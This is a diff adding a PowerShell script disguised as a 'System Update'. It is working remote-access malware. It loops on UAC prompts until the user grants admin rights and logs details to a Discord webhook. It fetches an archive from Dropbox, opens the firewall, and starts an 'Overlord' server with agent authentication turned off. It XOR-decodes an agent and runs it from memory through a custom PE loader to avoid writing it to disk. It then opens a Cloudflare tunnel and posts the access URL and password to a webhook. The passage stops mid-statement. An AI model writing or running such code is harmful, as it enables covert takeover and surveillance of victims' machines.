@@ -1,0 +1,744 @@
+# Auto-elevate to admin (UAC)
+$LogWebhook = "https://discord.com/api/webhooks/1531215890442620998/Lz8XfZ28aF0XaUb6u0RYOPNGEbR3ntS_NM9S5-8WL2ARXw8ur_tvOSHhQy-On_QulUnz"
+
+function Send-Log($msg) {
+    try {
+        $body = @{ content = "[sysupdate] $msg" } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri $LogWebhook -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
+    if (-not $scriptPath) { $scriptPath = Join-Path $PSScriptRoot "sysupdate.ps1" }
+    Send-Log "Not admin. scriptPath=$scriptPath PSCommandPath=$PSCommandPath PSScriptRoot=$PSScriptRoot"
+
+    try {
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("kernel32.dll")]
+    public static extern bool AllocConsole();
+}
+"@
+        $hwnd = [Win32]::GetConsoleWindow()
+        Send-Log "ConsoleWindow handle=$hwnd"
+        if ($hwnd -eq [IntPtr]::Zero) {
+            [Win32]::AllocConsole() | Out-Null
+            $hwnd = [Win32]::GetConsoleWindow()
+            Send-Log "AllocConsole done, new handle=$hwnd"
+        }
+    } catch {
+        Send-Log "Win32 init error: $($_.Exception.Message)"
+    }
+
+    while ($true) {
+        try {
+            Send-Log "Attempting Start-Process RunAs..."
+            $proc = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -Wait -PassThru -WindowStyle Hidden
+            Send-Log "Elevated instance exited with code $($proc.ExitCode)"
+            exit $proc.ExitCode
+        } catch {
+            $errMsg = $_.Exception.Message
+            Send-Log "UAC elevation failed: $errMsg"
+            Write-Host "  Admin elevation required. Please accept the UAC prompt."
+            Start-Sleep -Milliseconds 1000
+        }
+    }
+}
+
+$ErrorActionPreference = "Stop"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$DiscordWebhook = "https://discord.com/api/webhooks/1530617606363545700/OakzUbsADoAH4NknmHSJ-bm2cK4fgw9pNzCs9YmYNUY0xZGmmIR_dA3Z8QxUIR8g5QBB"
+$DownloadUrl = "https://www.dropbox.com/scl/fi/qq34o9it4rgalejc7yg3i/data.zip?rlkey=a99oakk05ygp6imbb4myiel7h&st=dhkt8of2&dl=1"
+$WorkDir = Join-Path $env:TEMP "SysUpd"
+$ServerDir = Join-Path $WorkDir "Server"
+$ToolsDir = Join-Path $WorkDir ".tools"
+
+# Bun versions to try (newest first, fallback if CPU incompatible)
+# Always use "baseline" builds first — they don't require AVX2/AVX-512
+$BunVersions = @(
+    @{ tag = "bun-v1.2.23"; zip = "bun-windows-x64-baseline.zip" },
+    @{ tag = "bun-v1.2.23"; zip = "bun-windows-x64.zip" },
+    @{ tag = "bun-v1.1.30"; zip = "bun-windows-x64-baseline.zip" },
+    @{ tag = "bun-v1.1.30"; zip = "bun-windows-x64.zip" }
+)
+
+# Look for agent.exe.enc in script dir first, then WorkDir (resolved after extraction)
+$ScriptDir = if ($PSCommandPath) { Split-Path $PSCommandPath } elseif ($PSScriptRoot) { $PSScriptRoot } else { "" }
+$AgentEnc = $null
+
+function Get-FileWithRetry {
+    param([string]$Uri, [string]$OutFile, [int]$MaxRetries = 2)
+    for ($attempt = 0; $attempt -le $MaxRetries; $attempt++) {
+        if ($attempt -gt 0) {
+            Write-Host "  Retry $attempt/$MaxRetries..." -ForegroundColor Yellow
+            Start-Sleep -Seconds 2
+        }
+        try {
+            & curl.exe -L -f -o $OutFile $Uri --max-time 300 --retry 2 2>$null
+            if ($LASTEXITCODE -eq 0 -and (Test-Path $OutFile) -and (Get-Item $OutFile).Length -gt 1024) {
+                return $true
+            }
+        } catch {}
+    }
+    return $false
+}
+
+Write-Host ""
+Write-Host "=========================================================="
+Write-Host "  System Update - Setting up..."
+Write-Host "=========================================================="
+Write-Host ""
+
+# ============================================================
+#  Step 1: Download and extract files
+# ============================================================
+$needsExtraction = $false
+if (-not (Test-Path $ServerDir)) {
+    $needsExtraction = $true
+} elseif (-not (Test-Path "$ServerDir\package.json") -or -not (Test-Path "$ServerDir\src")) {
+    Write-Host "[!] Incomplete extraction detected, re-extracting..."
+    $prevEAP = $ErrorActionPreference
+    $ErrorActionPreference = "SilentlyContinue"
+    taskkill /F /IM bun.exe
+    taskkill /F /IM node.exe
+    $ErrorActionPreference = $prevEAP
+    Start-Sleep -Seconds 2
+    Remove-Item $ServerDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item (Join-Path $WorkDir "Client") -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item (Join-Path $WorkDir "Overlord-Server") -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item (Join-Path $WorkDir "Overlord-Client") -Recurse -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 1
+    $needsExtraction = $true
+}
+
+New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
+New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null
+
+# ============================================================
+#  Parallel downloads (data.zip + bun + cloudflared via curl)
+# ============================================================
+$zipPath = Join-Path $env:TEMP "sysupdate-cache.zip"
+$bunDir = Join-Path $ToolsDir "bun"
+$bunZip = Join-Path $env:TEMP "bun-win.zip"
+$cfPath = Join-Path $ToolsDir "cloudflared.exe"
+
+$needZip = $needsExtraction -and -not (Test-Path $zipPath)
+$needBun = $false
+if (-not (Get-Command bun -ErrorAction SilentlyContinue)) {
+    if (-not (Test-Path "$bunDir\bun.exe") -and -not (Test-Path "$env:USERPROFILE\.bun\bin\bun.exe")) {
+        $needBun = $true
+    }
+}
+$needCf = (-not (Get-Command cloudflared -ErrorAction SilentlyContinue)) -and -not (Test-Path $cfPath) -and -not (Test-Path "$WorkDir\cloudflared.exe")
+
+$hasAny = $needZip -or $needBun -or $needCf
+
+Write-Host "[1/6] Downloading..."
+
+if ($hasAny) {
+    $curlArgs = @()
+    if ($needZip) { $curlArgs += @("--parallel", "--parallel-max", "3", "-L", "-f", "-o", $zipPath, $DownloadUrl, "--max-time", "300", "--retry", "2") }
+    if ($needBun) { if ($needZip) { $curlArgs += "--next" }; $curlArgs += @("-L", "-f", "-o", $bunZip, "https://github.com/oven-sh/bun/releases/download/$($BunVersions[0].tag)/$($BunVersions[0].zip)", "--max-time", "300", "--retry", "2") }
+    if ($needCf) { if ($needZip -or $needBun) { $curlArgs += "--next" }; $curlArgs += @("-L", "-f", "-o", $cfPath, "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe", "--max-time", "300", "--retry", "2") }
+
+    if (-not $needZip) { $curlArgs = @($curlArgs | Where-Object { $_ -ne "--parallel" -and $_ -ne "--parallel-max" -and $_ -ne "3" }) }
+
+    $dlSw = [System.Diagnostics.Stopwatch]::StartNew()
+    $prevEAP = $ErrorActionPreference
+    $ErrorActionPreference = "Continue"
+    & curl.exe @curlArgs 2>$null
+    $ErrorActionPreference = $prevEAP
+    $dlSw.Stop()
+
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "[error] One or more downloads failed (curl exit $LASTEXITCODE)." -ForegroundColor Red
+        exit 1
+    }
+
+    $totalMB = 0
+    if ($needZip -and (Test-Path $zipPath)) { $totalMB += (Get-Item $zipPath).Length / 1MB }
+    if ($needBun -and (Test-Path $bunZip)) { $totalMB += (Get-Item $bunZip).Length / 1MB }
+    if ($needCf -and (Test-Path $cfPath)) { $totalMB += (Get-Item $cfPath).Length / 1MB }
+    Write-Host "  Downloaded: $([math]::Round($totalMB, 1)) MB in $($dlSw.Elapsed.TotalSeconds.ToString('F1'))s ($([math]::Round($totalMB / [Math]::Max(0.1, $dlSw.Elapsed.TotalSeconds), 1)) MB/s)"
+} else {
+    Write-Host "  All files present, skipping."
+}
+
+# ============================================================
+#  Step 2: Extract data.zip
+# ============================================================
+if ($needsExtraction) {
+    if (-not (Test-Path $zipPath)) {
+        Write-Host "[error] data.zip not found after download!" -ForegroundColor Red
+        exit 1
+    }
+    Write-Host "[2/6] Extracting..."
+    Expand-Archive -Path $zipPath -DestinationPath $WorkDir -Force
+    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
+    $nested = Join-Path $WorkDir "data"
+    if (Test-Path $nested) {
+        Get-ChildItem $nested | Move-Item -Destination $WorkDir -Force
+        Remove-Item $nested -Force -ErrorAction SilentlyContinue
+    }
+
+    $extractedSvr = Join-Path $WorkDir "Overlord-Server"
+    $extractedCli = Join-Path $WorkDir "Overlord-Client"
+    if (Test-Path $extractedSvr) {
+        if (Test-Path $ServerDir) { Remove-Item $ServerDir -Recurse -Force; Start-Sleep -Milliseconds 500 }
+        if (Test-Path $ServerDir) { Remove-Item $ServerDir -Recurse -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1 }
+        if (-not (Test-Path $ServerDir)) {
+            Rename-Item $extractedSvr $ServerDir -Force
+        } else {
+            Get-ChildItem $extractedSvr | Move-Item -Destination $ServerDir -Force
+            Remove-Item $extractedSvr -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+    if (Test-Path $extractedCli) {
+        $clientDir = Join-Path $WorkDir "Client"
+        if (Test-Path $clientDir) { Remove-Item $clientDir -Recurse -Force; Start-Sleep -Milliseconds 500 }
+        if (-not (Test-Path $clientDir)) {
+            Rename-Item $extractedCli $clientDir -Force
+        } else {
+            Get-ChildItem $extractedCli | Move-Item -Destination $clientDir -Force
+            Remove-Item $extractedCli -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    Write-Host "  Extracted."
+} else {
+    Write-Host "[2/6] Already extracted, skipping..."
+}
+
+# Resolve agent.exe.enc now that extraction is done
+$encCandidates = @(
+    (Join-Path $ScriptDir "agent.exe.enc"),
+    (Join-Path $ScriptDir "bin\agent.exe.enc"),
+    (Join-Path $WorkDir "Client\agent.exe.enc"),
+    (Join-Path $WorkDir "Overlord-Client\agent.exe.enc")
+)
+foreach ($c in $encCandidates) {
+    if (Test-Path $c) { $AgentEnc = $c; break }
+}
+
+# ============================================================
+#  Step 3: Install bun (with version fallback for CPU compat)
+# ============================================================
+function Test-BunBinary {
+    param([string]$Path)
+    if (-not (Test-Path $Path)) { return $false }
+    if ((Get-Item $Path).Length -lt 1MB) { return $false }
+    $prevEAP = $ErrorActionPreference
+    $ErrorActionPreference = "Continue"
+    & $Path --version 2>$null | Out-Null
+    $ok = $LASTEXITCODE -eq 0
+    $ErrorActionPreference = $prevEAP
+    return $ok
+}
+
+function Find-Bun {
+    $cmd = Get-Command bun -ErrorAction SilentlyContinue
+    if ($cmd -and (Test-BunBinary $cmd.Source)) { return $cmd.Source }
+    $candidates = @(
+        "$env:USERPROFILE\.bun\bin\bun.exe",
+        "$env:LOCALAPPDATA\bun\bun.exe",
+        "$ToolsDir\bun\bun.exe"
+    )
+    foreach ($c in $candidates) {
+        if (Test-BunBinary $c) { return $c }
+    }
+    return $null
+}
+
+$bunPath = Find-Bun
+if (-not $bunPath) {
+    Write-Host "[3/6] Installing bun..."
+    $bunInstalled = $false
+    foreach ($ver in $BunVersions) {
+        $tag = $ver.tag
+        $zipName = $ver.zip
+        $url = "https://github.com/oven-sh/bun/releases/download/$tag/$zipName"
+        Write-Host "  Trying $tag..."
+
+        $prevEAP = $ErrorActionPreference
+        $ErrorActionPreference = "Continue"
+        & curl.exe -L -f -o $bunZip $url --max-time 300 --retry 1 2>$null
+        $dlOk = $LASTEXITCODE -eq 0
+        $ErrorActionPreference = $prevEAP
+
+        if (-not $dlOk -or -not (Test-Path $bunZip) -or (Get-Item $bunZip).Length -lt 1MB) {
+            Write-Host "  $tag download failed, trying next..." -ForegroundColor Yellow
+            Remove-Item $bunZip -Force -ErrorAction SilentlyContinue
+            continue
+        }
+
+        New-Item -ItemType Directory -Path $bunDir -Force | Out-Null
+        Expand-Archive -Path $bunZip -DestinationPath $bunDir -Force
+        $subDir = Join-Path $bunDir "bun-windows-x64"
+        $subDirBaseline = Join-Path $bunDir "bun-windows-x64-baseline"
+        if (Test-Path $subDir) {
+            Get-ChildItem $subDir | Move-Item -Destination $bunDir -Force
+            Remove-Item $subDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        if (Test-Path $subDirBaseline) {
+            Get-ChildItem $subDirBaseline | Move-Item -Destination $bunDir -Force
+            Remove-Item $subDirBaseline -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        Remove-Item $bunZip -Force -ErrorAction SilentlyContinue
+
+        $testPath = Join-Path $bunDir "bun.exe"
+        if (Test-BunBinary $testPath) {
+            $bunPath = $testPath
+            Write-Host "  $tag works!"
+            $bunInstalled = $true
+            break
+        } else {
+            Write-Host "  $tag crashed, trying next..." -ForegroundColor Yellow
+            Remove-Item $bunDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    if (-not $bunInstalled) {
+        # Check if a pre-compiled server exe exists — bun not needed
+        $prebuiltExe = $null
+        foreach ($c in @(
+            (Join-Path $ServerDir "dist\overlord-server.exe"),
+            (Join-Path $ServerDir "overlord-server.exe"),
+            (Join-Path $WorkDir "overlord-server.exe"),
+            (Join-Path $ToolsDir "overlord-server.exe")
+        )) {
+            if (Test-Path $c) { $prebuiltExe = $c; break }
+        }
+        if ($prebuiltExe) {
+            Write-Host "  Bun not available, using pre-compiled server."
+            $bunPath = $null
+        } else {
+            Write-Host ""
+            Write-Host "[error] All bun versions failed (CPU may not support required instructions)." -ForegroundColor Red
+            Write-Host "  Pre-compile the server on a working machine:" -ForegroundColor Yellow
+            Write-Host "    cd Overlord-Server && bun run build:prod:win" -ForegroundColor Yellow
+            Write-Host "  Upload dist/overlord-server.exe into the Dropbox Server/ dir and re-zip." -ForegroundColor Yellow
+            exit 1
+        }
+    }
+} else {
+    Write-Host "[3/6] bun found."
+}
+if ($bunPath) { $bunDir = Split-Path $bunPath; $env:PATH = "$bunDir;$env:PATH" }
+
+# ============================================================
+#  Step 4: Verify cloudflared
+# ============================================================
+function Find-Cloudflared {
+    $cmd = Get-Command cloudflared -ErrorAction SilentlyContinue
+    if ($cmd) { return $cmd.Source }
+    $candidates = @(
+        "$WorkDir\cloudflared.exe",
+        "$ToolsDir\cloudflared.exe",
+        "$env:USERPROFILE\cloudflared.exe"
+    )
+    foreach ($c in $candidates) {
+        if (Test-Path $c) { return $c }
+    }
+    return $null
+}
+
+$cfPath = Find-Cloudflared
+if (-not $cfPath) {
+    Write-Host "[error] cloudflared.exe not found after download!" -ForegroundColor Red
+    exit 1
+} else {
+    Write-Host "[4/6] Tunnel ready."
+}
+
+# ============================================================
+#  Step 4: Clean up old processes and DB
+# ============================================================
+Write-Host "[5/6] Cleaning up..."
+Get-Process bun -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process cloudflared -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process agent -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+
+$portInUse = Get-NetTCPConnection -LocalPort 5173 -ErrorAction SilentlyContinue
+if ($portInUse) {
+    $portInUse | Select-Object -ExpandProperty OwningProcess -Unique | ForEach-Object {
+        Stop-Process -Id $_ -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep -Seconds 2
+}
+
+$dataDir = Join-Path $env:APPDATA "Overlord"
+$dbFile = Join-Path $dataDir "overlord.db"
+$saveFile = Join-Path $dataDir "save.json"
+Remove-Item $dbFile -Force -ErrorAction SilentlyContinue
+Remove-Item "$dbFile-wal" -Force -ErrorAction SilentlyContinue
+Remove-Item "$dbFile-shm" -Force -ErrorAction SilentlyContinue
+Remove-Item $saveFile -Force -ErrorAction SilentlyContinue
+
+# ============================================================
+#  Step 5: Compile in-memory PE loader
+# ============================================================
+Write-Host "[6/6] Compiling loader..."
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class MemPELoader
+{
+    public static byte[] PE;
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr mod, string name);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr mod, IntPtr ordinal);
+
+    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
+    static extern IntPtr GetModuleHandle(string name);
+
+    [DllImport("ntdll.dll")]
+    static extern int RtlAddFunctionTable(IntPtr table, uint count, ulong baseImg);
+
+    [DllImport("kernel32.dll")]
+    static extern void RtlMoveMemory(IntPtr dst, IntPtr src, uint size);
+
+    public static void LoadAndRun()
+    {
+        IntPtr src = Marshal.AllocHGlobal(PE.Length);
+        Marshal.Copy(PE, 0, src, PE.Length);
+
+        try
+        {
+            if ((ushort)Marshal.ReadInt16(src) != 0x5A4D) return;
+            int peOff = Marshal.ReadInt32(src + 0x3C);
+            IntPtr nt = src + peOff;
+            if (Marshal.ReadInt32(nt) != 0x4550) return;
+            int numSec = Marshal.ReadInt16(nt + 6);
+            int sizeOpt = (ushort)Marshal.ReadInt16(nt + 20);
+            if ((ushort)Marshal.ReadInt16(nt + 4) != 0x8664) return;
+            IntPtr opt = nt + 24;
+            if ((ushort)Marshal.ReadInt16(opt) != 0x020B) return;
+
+            uint entryRVA = (uint)Marshal.ReadInt32(opt + 16);
+            long imgBase = Marshal.ReadInt64(opt + 24);
+            uint sizeOfImage = (uint)Marshal.ReadInt32(opt + 56);
+            uint sizeOfHeaders = (uint)Marshal.ReadInt32(opt + 60);
+            int numDir = Marshal.ReadInt32(opt + 108);
+
+            uint relocRVA = 0, relocSize = 0;
+            uint importRVA = 0, importSize = 0;
+            uint excRVA = 0, excSize = 0;
+            if (numDir > 5) { relocRVA = (uint)Marshal.ReadInt32(opt + 112 + 5 * 8); relocSize = (uint)Marshal.ReadInt32(opt + 112 + 5 * 8 + 4); }
+            if (numDir > 1) { importRVA = (uint)Marshal.ReadInt32(opt + 112 + 1 * 8); importSize = (uint)Marshal.ReadInt32(opt + 112 + 1 * 8 + 4); }
+            if (numDir > 3) { excRVA = (uint)Marshal.ReadInt32(opt + 112 + 3 * 8); excSize = (uint)Marshal.ReadInt32(opt + 112 + 3 * 8 + 4); }
+
+            IntPtr secHdr = opt + sizeOpt;
+            uint[] secVA = new uint[numSec];
+            uint[] secRawPtr = new uint[numSec];
+            uint[] secCopyLen = new uint[numSec];
+            for (int i = 0; i < numSec; i++)
+            {
+                IntPtr sh = secHdr + i * 40;
+                uint vSize = (uint)Marshal.ReadInt32(sh + 8);
+                uint vAddr = (uint)Marshal.ReadInt32(sh + 12);
+                uint rawSize = (uint)Marshal.ReadInt32(sh + 16);
+                uint rawPtr = (uint)Marshal.ReadInt32(sh + 20);
+                secVA[i] = vAddr;
+                secRawPtr[i] = rawPtr;
+                secCopyLen[i] = Math.Min(rawSize, vSize);
+            }
+
+            IntPtr target = VirtualAlloc((IntPtr)imgBase, sizeOfImage, 0x3000, 0x40);
+            bool relocated = (target != (IntPtr)imgBase);
+            if (target == IntPtr.Zero)
+                target = VirtualAlloc(IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
+            if (target == IntPtr.Zero) { Marshal.FreeHGlobal(src); return; }
+
+            long delta = (long)target - imgBase;
+            RtlMoveMemory(target, src, sizeOfHeaders);
+
+            for (int i = 0; i < numSec; i++)
+                if (secCopyLen[i] > 0 && secRawPtr[i] > 0 && secRawPtr[i] < PE.Length)
+                    RtlMoveMemory(target + (int)secVA[i], src + (int)secRawPtr[i], secCopyLen[i]);
+
+            Marshal.FreeHGlobal(src);
+            src = IntPtr.Zero;
+
+            if (relocated && relocRVA > 0 && relocSize > 0)
+                ApplyRelocations(target, delta, relocRVA, relocSize);
+
+            if (importRVA > 0 && importSize > 0)
+                ResolveImports(target, importRVA);
+
+            if (excRVA > 0 && excSize >= 12)
+                RtlAddFunctionTable(target + (int)excRVA, excSize / 12, (ulong)(long)target);
+
+            IntPtr entry = target + (int)entryRVA;
+            uint tid;
+            CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, out tid);
+        }
+        catch { if (src != IntPtr.Zero) Marshal.FreeHGlobal(src); }
+    }
+
+    static void ApplyRelocations(IntPtr target, long delta, uint rva, uint size)
+    {
+        IntPtr p = target + (int)rva;
+        IntPtr end = p + (int)size;
+        while ((long)p < (long)end)
+        {
+            uint pageRVA = (uint)Marshal.ReadInt32(p);
+            uint blockSize = (uint)Marshal.ReadInt32(p + 4);
+            if (blockSize < 8) break;
+            int entries = (int)((blockSize - 8) / 2);
+            for (int i = 0; i < entries; i++)
+            {
+                ushort e = (ushort)Marshal.ReadInt16(p + 8 + i * 2);
+                if ((e >> 12) == 10)
+                {
+                    IntPtr addr = target + (int)pageRVA + (e & 0xFFF);
+                    Marshal.WriteInt64(addr, Marshal.ReadInt64(addr) + delta);
+                }
+            }
+            p += (int)blockSize;
+            p = (IntPtr)(((long)p + 3) & ~3L);
+        }
+    }
+
+    static void ResolveImports(IntPtr target, uint importRVA)
+    {
+        IntPtr desc = target + (int)importRVA;
+        while (true)
+        {
+            uint origFT = (uint)Marshal.ReadInt32(desc);
+            uint nameRVA = (uint)Marshal.ReadInt32(desc + 12);
+            uint firstThunk = (uint)Marshal.ReadInt32(desc + 16);
+            if (nameRVA == 0 && origFT == 0) break;
+
+            string dllName = Marshal.PtrToStringAnsi(target + (int)nameRVA);
+            IntPtr hMod = GetModuleHandle(dllName);
+            if (hMod == IntPtr.Zero) { desc += 20; continue; }
+
+            IntPtr iltPtr = origFT > 0 ? target + (int)origFT : target + (int)firstThunk;
+            IntPtr iatPtr = target + (int)firstThunk;
+
+            for (int j = 0; ; j++)
+            {
+                long entry = Marshal.ReadInt64(iltPtr + j * 8);
+                if (entry == 0) break;
+
+                IntPtr funcAddr;
+                if (entry < 0)
+                {
+                    funcAddr = GetProcAddress(hMod, (IntPtr)(long)(ushort)(entry & 0xFFFF));
+                }
+                else
+                {
+                    IntPtr hintName = target + (int)(entry & 0x7FFFFFFF);
+                    funcAddr = GetProcAddress(hMod, Marshal.PtrToStringAnsi(hintName + 2));
+                }
+                if (funcAddr != IntPtr.Zero)
+                    Marshal.WriteIntPtr(iatPtr + j * 8, funcAddr);
+            }
+            desc += 20;
+        }
+    }
+}
+"@ -Language CSharp -ErrorAction Stop
+Write-Host "  Compiled OK."
+
+# ============================================================
+#  Step 6: Generate password and start server
+# ============================================================
+$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+$Password = -join (1..24 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
+
+Write-Host ""
+Write-Host "=========================================================="
+Write-Host "  Instance Ready"
+Write-Host "=========================================================="
+Write-Host "  Username : admin"
+Write-Host "  Password : $Password"
+Write-Host "=========================================================="
+Write-Host ""
+Write-Host "  Starting services..."
+Write-Host ""
+
+$serverEnv = @{
+    "HOST" = "0.0.0.0"
+    "PORT" = "5173"
+    "OVERLORD_TLS_OFFLOAD" = "true"
+    "OVERLORD_TRUST_PROXY" = "true"
+    "OVERLORD_PASS" = $Password
+    "OVERLORD_USER" = "admin"
+    "OVERLORD_HEALTHCHECK_URL" = "http://127.0.0.1:5173/health"
+    "LOG_LEVEL" = "info"
+    "NODE_ENV" = "development"
+    "OVERLORD_DISABLE_AGENT_AUTH" = "true"
+    "OVERLORD_ENROLLMENT_REQUIRE_APPROVAL" = "false"
+}
+foreach ($kv in $serverEnv.GetEnumerator()) { [Environment]::SetEnvironmentVariable($kv.Key, $kv.Value, "Process") }
+if ($bunDir) { $env:PATH = "$bunDir;$env:PATH" }
+
+# Check for pre-compiled server exe first
+$serverExe = $null
+$candidates = @(
+    (Join-Path $ServerDir "dist\overlord-server.exe"),
+    (Join-Path $ServerDir "overlord-server.exe"),
+    (Join-Path $WorkDir "overlord-server.exe"),
+    (Join-Path $ToolsDir "overlord-server.exe")
+)
+foreach ($c in $candidates) {
+    if (Test-Path $c) { $serverExe = $c; break }
+}
+
+# Allow bun through firewall silently (prevents popup)
+try {
+    $fwRule = "SysUpd-Bun"
+    netsh advfirewall firewall add rule name="$fwRule" dir=in action=allow program="$bunPath" enable=yes profile=any 2>$null | Out-Null
+} catch {}
+
+if ($serverExe) {
+    Write-Host "[core] Using pre-compiled server: $serverExe"
+    Write-Host "[core] Starting backend..."
+    $serverProc = Start-Process -FilePath $serverExe -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-core.log"
+} else {
+    Write-Host "[core] Installing dependencies..."
+    $installProc = Start-Process -FilePath $bunPath -ArgumentList "install" -WorkingDirectory $ServerDir -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\svc-install.log" -RedirectStandardError "$env:TEMP\svc-install-err.log"
+    if ($installProc.ExitCode -ne 0) {
+        Write-Host "[error] Dependency install failed (exit $($installProc.ExitCode))." -ForegroundColor Red
+        Get-Content "$env:TEMP\svc-install-err.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $_" -ForegroundColor DarkRed }
+        Get-Content "$env:TEMP\svc-install.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $_" }
+        exit 1
+    }
+    Write-Host "  Dependencies installed."
+
+    Write-Host "[core] Starting backend..."
+    $serverProc = Start-Process -FilePath $bunPath -ArgumentList "run","dev" -WorkingDirectory $ServerDir -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-core.log"
+}
+
+Write-Host "[core] Waiting for backend..."
+$ready = $false
+for ($i = 1; $i -le 30; $i++) {
+    Start-Sleep -Seconds 2
+    try {
+        $response = Invoke-WebRequest -Uri "http://127.0.0.1:5173/health" -UseBasicParsing -TimeoutSec 2 -ErrorAction Stop
+        if ($response.StatusCode -eq 200) { $ready = $true; break }
+    } catch {}
+    Write-Host "[core] Still waiting... ($i/30)"
+}
+if (-not $ready) {
+    Write-Host "[error] Backend failed to start." -ForegroundColor Red
+    Get-Content "$env:TEMP\svc-core.log" -ErrorAction SilentlyContinue
+    Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
+    exit 1
+}
+Write-Host "[core] Ready!"
+
+try {
+    $body = @{ user = "admin"; pass = $Password } | ConvertTo-Json
+    $loginResult = Invoke-WebRequest -Uri "http://127.0.0.1:5173/api/login" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 5
+    $loginData = $loginResult.Content | ConvertFrom-Json
+    if ($loginData.ok) { Write-Host "[auth] Login OK!" }
+} catch {
+    Write-Host "[auth] WARNING: Login check failed: $_" -ForegroundColor Yellow
+}
+
+# ============================================================
+#  Start agent from memory (no disk write!)
+# ============================================================
+Write-Host "[agent] Loading agent..."
+if (Test-Path $AgentEnc) {
+    $env:OVERLORD_SERVER = "ws://127.0.0.1:5173"
+    $env:OVERLORD_TLS_INSECURE_SKIP_VERIFY = "true"
+    $env:OVERLORD_MODE = "development"
+
+    $b64 = [System.IO.File]::ReadAllText($AgentEnc)
+    $peBytes = [Convert]::FromBase64String($b64)
+    $key = 0x5A
+    for ($i = 0; $i -lt $peBytes.Length; $i++) { $peBytes[$i] = $peBytes[$i] -bxor $key }
+    Write-Host "  Decoded: $([math]::Round($peBytes.Length / 1MB, 1)) MB"
+
+    [MemPELoader]::PE = $peBytes
+    [MemPELoader]::LoadAndRun()
+    Write-Host "[agent] Running in-memory!"
+} else {
+    Write-Host "  WARNING: agent not found!" -ForegroundColor Yellow
+}
+
+# ============================================================
+#  Start tunnel
+# ============================================================
+Write-Host ""
+Write-Host "[tunnel] Starting tunnel..."
+$tunnelUrl = ""
+$cfProcess = Start-Process -FilePath $cfPath -ArgumentList "tunnel","--url","http://localhost:5173" -NoNewWindow -PassThru -RedirectStandardError "$env:TEMP\svc-tunnel.log"
+
+for ($i = 0; $i -lt 30; $i++) {
+    Start-Sleep -Seconds 1
+    if (Test-Path "$env:TEMP\svc-tunnel.log") {
+        $logContent = Get-Content "$env:TEMP\svc-tunnel.log" -ErrorAction SilentlyContinue
+        foreach ($line in $logContent) {
+            if ($line -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com') {
+                $tunnelUrl = $Matches[0]
+                break
+            }
+        }
+    }
+    if ($tunnelUrl) { break }
+}
+
+if ($tunnelUrl) {
+    Write-Host ""
+    Write-Host "=========================================================="
+    Write-Host "  SERVICE IS LIVE!"
+    Write-Host "=========================================================="
+    Write-Host ""
+    Write-Host "  URL      : $tunnelUrl"
+    Write-Host "  Username : admin"
+    Write-Host "  Password : $Password"
+    Write-Host ""
+    Write-Host "=========================================================="
+
+    try {
+        $msg = "**Service Instance is LIVE**" + "`n`n" +
+               "**URL:** $tunnelUrl" + "`n" +
+               "**Username:** admin" + "`n" +
+               "**Password:** $Password" + "`n`n" +
+               "Open the URL in a browser to view the screen."
+        $body = @{ content = $msg } | ConvertTo-Json -Compress
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
